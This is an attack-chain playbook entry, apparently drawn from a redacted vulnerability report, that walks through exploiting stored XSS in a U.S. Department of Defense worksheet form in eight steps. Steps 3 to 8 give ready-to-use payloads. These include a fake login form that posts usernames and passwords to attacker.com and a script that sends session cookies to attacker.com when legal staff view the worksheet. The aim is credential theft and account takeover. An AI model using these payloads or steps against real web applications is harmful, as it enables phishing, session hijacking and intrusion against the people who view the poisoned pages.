---
id: ac-uuid-001
tags:
  - xss
  - stored-xss
  - credential-theft
  - account-takeover
  - phishing
  - dod
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-and-Navigate-to-Worksheet-Form]]'
  - '[[procedures/Test-Form-Fields-for-XSS]]'
  - '[[procedures/Inject-XSS-Payloads-into-Vulnerable-Fields]]'
  - '[[procedures/Submit-Worksheet-and-Trigger-Stored-XSS]]'
  - '[[procedures/Demonstrate-XSS-Impact-with-Payloads]]'
step_count: 8
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:36.866Z'
description: >-
  Exploits a stored XSS vulnerability in approximately 64 text fields of a U.S.
  Department of Defense web application's worksheet form, allowing injection of
  malicious JavaScript that executes when legal personnel view the worksheets,
  enabling credential theft via phishing, account takeover, keystroke logging,
  or drive-by downloads.
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in DoD Worksheet Form Leading to Credential Theft and Account Takeover

Multi-stage attack chain demonstrating exploitation of a stored cross-site scripting (XSS) vulnerability in a U.S. Department of Defense web application. The attack targets worksheet forms used by legal personnel, injecting malicious JavaScript into approximately 64 text fields. When authenticated users view the submitted worksheets, the payloads execute in their browser context, potentially stealing credentials, logging keystrokes, or facilitating account takeovers.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access Application] --> B[Navigate to Form]
    B --> C[Test Sanitization]
    C --> D[Inject Payloads]
    D --> E[Submit Worksheet]
    E --> F[Trigger XSS]
    F --> G[Execute Malicious JS]
    G --> H[Steal Credentials]

    style A fill:#e74c3c
    style B fill:#e74c3c
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#3498db
    style G fill:#27ae60
    style H fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome with developer tools for payload testing)

### Target Environment

- Web application: U.S. DoD internal portal (https://█████)
- Required services/ports: HTTPS (443)
- Network access requirements: Authenticated access to the DoD application (user account with worksheet submission privileges)

### Initial Access Requirements

- Credential requirements: Valid DoD user credentials
- Network position: Internal network or VPN access to the application
- Prior access needed: None beyond authentication

## Detailed Attack Procedures

### Step 1: Access the Main Page
procedure: [[procedures/Access-and-Navigate-to-Worksheet-Form]]

**Objective**: Gain entry to the DoD web application to begin the worksheet creation process.

**Instructions**: Open a web browser and navigate to the application's main page by browsing to https://█████. Ensure you are authenticated with valid credentials if required.

**Expected Output**: Successful login and display of the main dashboard or portal page.

**Success Indicators**:
- Application homepage loads without errors
- User session is active

### Step 2: Navigate to the Worksheet Creation Page
procedure: [[procedures/Access-and-Navigate-to-Worksheet-Form]]

**Objective**: Locate and enter the worksheet creation workflow.

**Instructions**: From the main page, click on █████████. Once on the ██████ page, click ███ and then ████████ to proceed to the form entry section. This positions you in the multi-step form process for creating a new worksheet.

**Expected Output**: Worksheet creation interface appears, prompting for initial inputs.

**Success Indicators**:
- Navigation completes without redirects or errors
- Form fields for worksheet data are visible

### Step 3: Proceed to the Form and Enter Basic Information
procedure: [[procedures/Access-and-Navigate-to-Worksheet-Form]]

**Objective**: Advance through the initial form steps and test basic input sanitization.

**Instructions**: Click "Continue" to move to the detailed form. Fill in basic fields such as your name with a simple XSS test payload like `<script>alert(1)</script>`, then click Submit. Observe if the payload is sanitized (it should be in the name field based on initial tests).

**Expected Output**: Form submission confirmation, with no alert triggered in the name field.

**Success Indicators**:
- Basic fields submit successfully
- No JavaScript execution in sanitized fields

### Step 4: Test Initial Sanitization in Form Fields
procedure: [[procedures/Test-Form-Fields-for-XSS]]

**Objective**: Identify which form fields properly sanitize input versus those vulnerable to XSS.

**Instructions**: After basic submission, return to the form and systematically test additional text fields with XSS payloads like `<script>alert('XSS')</script>`. Note that while the name field sanitizes, subsequent text inputs in the worksheet do not filter HTML or script tags effectively.

**Expected Output**: Payloads execute or persist unsanitized in non-name fields, confirming vulnerability.

**Success Indicators**:
- Alerts or malformed rendering in tested fields
- Approximately 64 fields identified as vulnerable through enumeration

### Step 5: Inject XSS Payloads into Vulnerable Fields
procedure: [[procedures/Inject-XSS-Payloads-into-Vulnerable-Fields]]

**Objective**: Populate the form with malicious JavaScript in all exploitable text areas to store the payload server-side.

**Instructions**: Complete the worksheet form by entering targeted XSS payloads in every text-accepting field (totaling around 64). Use payloads designed for credential theft, such as fake login forms or cookie exfiltration scripts. For example, insert `<h3>Please login to proceed</h3><form action="http://attacker.com/steal">Username:<br><input type="text" name="username"><br>Password:<br><input type="password" name="password"><br><input type="submit" value="Logon"></form>` in multiple fields.

**Expected Output**: Form filled with payloads; no immediate execution as it's stored.

**Success Indicators**:
- All 64 fields populated without form rejection
- Payloads visible in form preview if available

### Step 6: Submit the Form
procedure: [[procedures/Submit-Worksheet-and-Trigger-Stored-XSS]]

**Objective**: Store the malicious payloads on the server by finalizing the worksheet submission.

**Instructions**: Review the form and click "Finish" to submit. The application will process the input and store the worksheet, returning a confirmation message with a ticket number.

**Expected Output**: Confirmation page with ticket number, indicating successful storage.

**Success Indicators**:
- Submission succeeds
- Ticket number generated for tracking the worksheet

### Step 7: Trigger the Stored XSS
procedure: [[procedures/Submit-Worksheet-and-Trigger-Stored-XSS]]

**Objective**: Cause the stored payloads to execute by having an authenticated user view the worksheet.

**Instructions**: As the attacker (or simulating a victim), click ███████ or return to the ████████ page, enter your ticket info in the █████ area to view or modify the worksheet. The injected JavaScript will execute automatically upon rendering the text fields.

**Expected Output**: Malicious JavaScript runs in the viewer's browser context, e.g., displaying a fake login form or redirecting with cookies.

**Success Indicators**:
- Payload execution confirmed (alert, form display, or network request to attacker server)
- No server-side errors during view

### Step 8: Demonstrate Impact with Specific Payloads
procedure: [[procedures/Demonstrate-XSS-Impact-with-Payloads]]

**Objective**: Validate the attack's potential for real harm, such as credential theft or account takeover.

**Instructions**: Use advanced payloads like `<script>window.location="http://attacker.com/?cookie=" + document.cookie</script>` for cookie theft (testable if authenticated) or the phishing form payload mentioned earlier. Monitor attacker server for incoming data when a victim views the worksheet.

**Expected Output**: Stolen data (usernames, passwords, cookies) sent to attacker-controlled endpoint.

**Success Indicators**:
- Fake login form captures and submits credentials
- Redirect occurs with appended cookies
- Potential for keystroke logging or drive-by downloads if extended

## Attack Chain Summary

### Key Achievements

1. Identified and exploited stored XSS in 64 form fields due to inadequate sanitization.
2. Demonstrated execution in the context of high-privilege legal personnel.
3. Enabled severe impacts including credential theft and account takeover via phishing and data exfiltration.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
